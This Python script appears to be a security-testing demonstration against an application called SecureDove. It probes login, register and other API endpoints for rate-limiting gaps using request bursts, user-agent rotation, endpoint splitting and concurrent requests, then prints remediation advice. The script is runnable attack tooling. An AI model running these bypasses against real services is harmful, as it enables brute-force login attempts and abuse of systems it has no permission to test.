#!/usr/bin/env python3
"""
Rate Limiting Bypass Attack Script for SecureDove
Educational demonstration of rate limiting bypass vulnerabilities

This script demonstrates how an attacker could bypass rate limiting
by using various techniques like IP rotation, request splitting, etc.
"""

import requests
import sys
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Any, Optional
import random
import string

class RateLimitBypassAttacker:
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()

    def generate_random_string(self, length: int = 8) -> str:
        """Generate a random string for testing"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def test_endpoint_rate_limit(self, endpoint: str, method: str = "POST",
                               payload: Optional[Dict] = None) -> Dict[str, Any]:
        """
        Test rate limiting on a specific endpoint

        Args:
            endpoint: API endpoint to test
            method: HTTP method (GET, POST, etc.)
            payload: Request payload for POST requests

        Returns:
            Dictionary with test results
        """
        url = f"{self.base_url}{endpoint}"
        results = {
            "endpoint": endpoint,
            "method": method,
            "requests_sent": 0,
            "successful_requests": 0,
            "rate_limited_requests": 0,
            "errors": 0,
            "bypass_successful": False
        }

        print(f"[+] Testing rate limiting on {method} {endpoint}")

        # Send requests rapidly to trigger rate limiting
        for i in range(20):  # Send 20 requests quickly
            try:
                if method.upper() == "POST":
                    response = self.session.post(url, json=payload, timeout=5)
                else:
                    response = self.session.get(url, timeout=5)

                results["requests_sent"] += 1

                if response.status_code == 200:
                    results["successful_requests"] += 1
                elif response.status_code == 429:  # Too Many Requests
                    results["rate_limited_requests"] += 1
                else:
                    results["errors"] += 1

                # Small delay to not overwhelm completely
                time.sleep(0.05)

            except requests.RequestException:
                results["errors"] += 1

        # Check if rate limiting was triggered
        if results["rate_limited_requests"] > 0:
            print(f"    âœ… Rate limiting detected ({results['rate_limited_requests']} requests blocked)")
        else:
            print("    âš ï¸  No rate limiting detected")
        return results

    def test_ip_rotation_bypass(self, endpoint: str) -> bool:
        """
        Test bypassing rate limits using different proxy/user-agent combinations

        Args:
            endpoint: API endpoint to test

        Returns:
            True if bypass successful, False otherwise
        """
        print(f"\n[+] Testing IP rotation bypass on {endpoint}")

        url = f"{self.base_url}{endpoint}"
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"
        ]

        successful_requests = 0
        rate_limited_requests = 0

        # Try requests with different user agents (simulating different clients)
        for i, ua in enumerate(user_agents):
            headers = {'User-Agent': ua}

            try:
                response = requests.post(url, json={"username": f"test{i}", "password": "test"}, headers=headers, timeout=5)

                if response.status_code == 200:
                    successful_requests += 1
                    print(f"    âœ… Request {i+1} successful with UA variation")
                elif response.status_code == 429:
                    rate_limited_requests += 1
                    print(f"    âŒ Request {i+1} rate limited")
                else:
                    print(f"    âš ï¸  Request {i+1} returned status {response.status_code}")

            except requests.RequestException as e:
                print(f"    âŒ Request {i+1} failed: {str(e)}")

            time.sleep(0.1)

        # If we can still make successful requests despite rate limiting
        if successful_requests > 0 and rate_limited_requests > 0:
            print("    ğŸš¨ VULNERABILITY: Rate limiting bypass possible with user-agent rotation")
            return True
        elif successful_requests == len(user_agents):
            print("    âš ï¸  No rate limiting detected at all")
            return False
        else:
            print("    âœ… Rate limiting appears effective")
            return False

    def test_request_splitting_bypass(self) -> bool:
        """
        Test bypassing rate limits by splitting requests across different endpoints

        Returns:
            True if bypass successful, False otherwise
        """
        print("\n[+] Testing request splitting bypass")

        endpoints = [
            "/api/auth/login",
            "/api/auth/register",
            "/api/contacts/search",
            "/api/messages/send",
            "/api/conversations/list"
        ]

        successful_requests = 0
        total_requests = 0

        # Send requests to different endpoints rapidly
        for endpoint in endpoints:
            url = f"{self.base_url}{endpoint}"

            for i in range(5):  # 5 requests per endpoint
                try:
                    if "login" in endpoint:
                        payload = {"username": self.generate_random_string(), "password": "test"}
                        response = requests.post(url, json=payload, timeout=5)
                    elif "register" in endpoint:
                        payload = {"username": self.generate_random_string(), "password": "test", "email": f"{self.generate_random_string()}@test.com"}
                        response = requests.post(url, json=payload, timeout=5)
                    elif "search" in endpoint:
                        response = requests.get(url, params={"q": self.generate_random_string()}, timeout=5)
                    else:
                        # For other endpoints, try GET first
                        response = requests.get(url, timeout=5)

                    total_requests += 1

                    if response.status_code in [200, 201, 400, 401, 403]:  # Expected responses
                        successful_requests += 1
                    elif response.status_code == 429:
                        print(f"    âŒ Rate limited on {endpoint}")
                        return False  # If any endpoint is rate limited, bypass failed

                except requests.RequestException:
                    pass  # Ignore connection errors

                time.sleep(0.02)  # Very small delay

        if successful_requests > total_requests * 0.8:  # 80% success rate
            print(f"    ğŸš¨ VULNERABILITY: Request splitting bypass successful ({successful_requests}/{total_requests} requests)")
            return True
        else:
            print("    âœ… Rate limiting appears effective across endpoints")
            return False

    def test_concurrent_requests_bypass(self, endpoint: str) -> bool:
        """
        Test bypassing rate limits using concurrent requests

        Args:
            endpoint: API endpoint to test

        Returns:
            True if bypass successful, False otherwise
        """
        print(f"\n[+] Testing concurrent requests bypass on {endpoint}")

        url = f"{self.base_url}{endpoint}"
        results = []

        def make_request(thread_id: int):
            try:
                payload = {"username": f"test{thread_id}", "password": "test"}
                response = requests.post(url, json=payload, timeout=10)
                return response.status_code
            except:
                return None

        # Launch 10 concurrent requests
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(make_request, i) for i in range(10)]

            for future in as_completed(futures):
                status_code = future.result()
                results.append(status_code)

        successful_requests = sum(1 for r in results if r in [200, 400, 401, 403])
        rate_limited_requests = sum(1 for r in results if r == 429)

        if successful_requests > 5 and rate_limited_requests == 0:
            print(f"    ğŸš¨ VULNERABILITY: Concurrent requests bypass successful ({successful_requests}/10 requests)")
            return True
        elif rate_limited_requests > 0:
            print(f"    âœ… Rate limiting effective ({rate_limited_requests} requests blocked)")
            return False
        else:
            print("    âš ï¸  No rate limiting detected")
            return False

    def demonstrate_vulnerability(self):
        """Main demonstration of rate limiting bypass vulnerabilities"""
        print("=" * 60)
        print("RATE LIMITING BYPASS DEMONSTRATION")
        print("=" * 60)
        print("This script demonstrates rate limiting bypass techniques")
        print("in the SecureDove application.\n")

        print(f"[*] Targeting server: {self.base_url}")

        # Test basic rate limiting on login endpoint
        login_payload = {"username": "test", "password": "test"}
        basic_test = self.test_endpoint_rate_limit("/api/auth/login", "POST", login_payload)

        # Test different bypass techniques
        bypass_tests = [
            ("IP/User-Agent Rotation", self.test_ip_rotation_bypass, ["/api/auth/login"]),
            ("Request Splitting", self.test_request_splitting_bypass, []),
            ("Concurrent Requests", self.test_concurrent_requests_bypass, ["/api/auth/login"])
        ]

        bypass_results = []
        for test_name, test_func, args in bypass_tests:
            print(f"\n{'='*20} {test_name} {'='*20}")
            if args:
                result = test_func(*args)
            else:
                result = test_func()
            bypass_results.append((test_name, result))

        # Summary
        successful_bypasses = [name for name, success in bypass_results if success]

        print("\n" + "=" * 60)
        print("ATTACK SUMMARY")
        print("=" * 60)

        print(f"Basic rate limiting test: {basic_test['rate_limited_requests']} requests blocked out of {basic_test['requests_sent']}")

        if successful_bypasses:
            print(f"\n[+] RATE LIMITING VULNERABILITIES CONFIRMED!")
            print("The following bypass techniques were successful:")
            for method in successful_bypasses:
                print(f"  - {method}")
        else:
            print("\n[-] No rate limiting bypass vulnerabilities detected")
            print("Rate limiting appears properly implemented")

        print("\n[*] Note: Rate limiting should be implemented server-side")
        print("[*] Use proper rate limiting libraries (express-rate-limit, etc.)")
        print("[*] Consider distributed rate limiting for multi-server deployments")
        print("[*] Implement proper monitoring and alerting for abuse detection")

def main():
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    else:
        base_url = "http://localhost:8000"

    print(f"[*] Targeting server: {base_url}")

    attacker = RateLimitBypassAttacker(base_url)
    attacker.demonstrate_vulnerability()

if __name__ == "__main__":
    main()